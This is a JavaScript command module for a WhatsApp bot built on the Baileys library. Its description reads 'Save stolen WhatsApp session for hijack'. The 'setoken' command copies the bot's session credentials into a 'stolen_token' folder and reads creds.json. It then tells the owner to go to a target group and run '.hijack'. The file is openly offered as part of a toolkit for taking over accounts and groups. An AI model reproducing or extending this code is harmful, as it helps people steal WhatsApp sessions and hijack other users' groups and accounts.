const fs = require('fs')
const path = require('path')
const { BufferJSON } = require('@whiskeysockets/baileys')

module.exports = {
  pattern: "setoken",
  category: 'owner',
  desc: "Save stolen WhatsApp session for hijack",
  usage: ".setoken",

  run: async ({ sock, from, msg, isOwner }) => {
    if (!isOwner) return sock.sendMessage(from, { text: "❌ Owner only" })

    const src = path.resolve('./auth_info_baileys')
    const dst = path.resolve('./stolen_token')

    if (fs.existsSync(dst)) fs.rmSync(dst, { recursive: true })
    fs.cpSync(src, dst, { recursive: true })

    const raw = JSON.parse(
      fs.readFileSync(path.join(dst, 'creds.json'), 'utf-8'),
      BufferJSON.reviver
    )

    await sock.sendMessage(from, {
      text: `✅ Token saved as: ${raw.me?.id || 'unknown'}\n\nNow go to target group and type:\n.hijack`
    })
  }
}
